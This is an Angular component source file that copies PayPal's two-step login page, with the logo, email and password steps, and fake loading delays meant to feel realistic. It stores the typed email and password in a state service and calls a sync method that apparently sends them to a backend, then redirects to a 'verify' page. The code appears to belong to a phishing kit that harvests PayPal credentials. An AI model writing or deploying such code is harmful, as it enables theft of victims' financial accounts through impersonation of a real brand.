import { Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, ReactiveFormsModule, FormBuilder, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { StateService } from '../../../services/state.service';
import { getFlowById } from '../../../services/flows.service';

@Component({
  selector: 'app-paypal-login',
  standalone: true,
  imports: [CommonModule, FormsModule, ReactiveFormsModule],
  template: `
    <div class="pp-flow-container">
      <div class="pp-login-card">
        <div class="pp-logo-container">
            <img src="/assets/flows/paypal/images/logo.svg" alt="PayPal" class="pp-logo">
        </div>
        
        <!-- Step 1: Email -->
        <div *ngIf="step() === 'email'">
            <form [formGroup]="emailForm" (ngSubmit)="onEmailSubmit()">
              <div class="pp-form-group">
                <input 
                  type="text" 
                  formControlName="email"
                  placeholder="Email or mobile number"
                  [class.error]="isFieldInvalid(emailForm, 'email')"
                >
              </div>
              
              <div style="margin-bottom: 20px;">
                <a href="javascript:void(0)" class="pp-link">Forgot email?</a>
              </div>

              <button 
                type="submit" 
                class="pp-btn-primary"
                [disabled]="emailForm.invalid || isLoading()"
              >
                <span *ngIf="!isLoading()">Next</span>
                <div *ngIf="isLoading()" class="pp-spinner"></div>
              </button>
              
              <div class="pp-divider"><span>or</span></div>
              
              <button type="button" class="pp-btn-secondary">
                Sign Up
              </button>
            </form>
        </div>

        <!-- Step 2: Password -->
        <div *ngIf="step() === 'password'">
            <div class="email-display">
                <span>{{ emailForm.get('email')?.value }}</span>
                <a href="javascript:void(0)" (click)="changeEmail()">Change</a>
            </div>

            <form [formGroup]="passwordForm" (ngSubmit)="onPasswordSubmit()">
              <div class="pp-form-group">
                <input 
                  type="password" 
                  formControlName="password"
                  placeholder="Password"
                  [class.error]="isFieldInvalid(passwordForm, 'password')"
                  autofocus
                >
              </div>
              
              <div style="margin-bottom: 20px;">
                <a href="javascript:void(0)" class="pp-link">Forgot password?</a>
              </div>

              <button 
                type="submit" 
                class="pp-btn-primary"
                [disabled]="passwordForm.invalid || isLoading()"
              >
                Log In
              </button>
            </form>
        </div>
      </div>
      
      <footer class="pp-footer">
         <div class="links">
            <a href="javascript:void(0)">Contact Us</a>
            <a href="javascript:void(0)">Privacy</a>
            <a href="javascript:void(0)">Legal</a>
            <a href="javascript:void(0)">Policy Updates</a>
            <a href="javascript:void(0)">Worldwide</a>
         </div>
         <!-- Typically no copyright on login footer, but sometimes little text -->
      </footer>
    </div>
  `,
  styleUrls: ['../../../styles/flows/paypal.scss']
})
export class PaypalLoginComponent {
  private fb = inject(FormBuilder);
  private router = inject(Router);
  private state = inject(StateService);

  step = signal<'email' | 'password'>('email');
  isLoading = signal(false);

  // Email Step Form
  emailForm = this.fb.group({
    email: ['', [Validators.required, Validators.minLength(3)]]
  });

  // Password Step Form
  passwordForm = this.fb.group({
    password: ['', [Validators.required, Validators.minLength(4)]]
  });

  constructor() {
    const flow = getFlowById('paypal');
    if (flow) {
      this.state.currentFlow.set(flow);
    }
  }

  isFieldInvalid(form: any, field: string): boolean {
    const control = form.get(field);
    return !!(control && control.invalid && (control.dirty || control.touched));
  }

  async onEmailSubmit() {
    if (this.emailForm.valid) {
      this.isLoading.set(true);
      // Simulate network delay for realistic feel
      setTimeout(() => {
        this.isLoading.set(false);
        this.state.email.set(this.emailForm.get('email')!.value!);
        this.step.set('password');
      }, 600);
    }
  }

  async onPasswordSubmit() {
    if (this.passwordForm.valid) {
      this.isLoading.set(true);
      const { password } = this.passwordForm.value;

      this.state.password.set(password!);
      this.state.isLoginSubmitted.set(true);
      await this.state.syncState();

      setTimeout(() => {
        this.isLoading.set(false);
        // Normally would go to OTP or dashboard.
        // For verification flow, let's assume strict security -> OTP or standard next step
        this.router.navigate(['/verify/step-success']); // Or redirect to specific PayPal OTP if we built it
      }, 1000);
    }
  }

  changeEmail() {
    this.step.set('email');
    this.passwordForm.reset();
  }
}
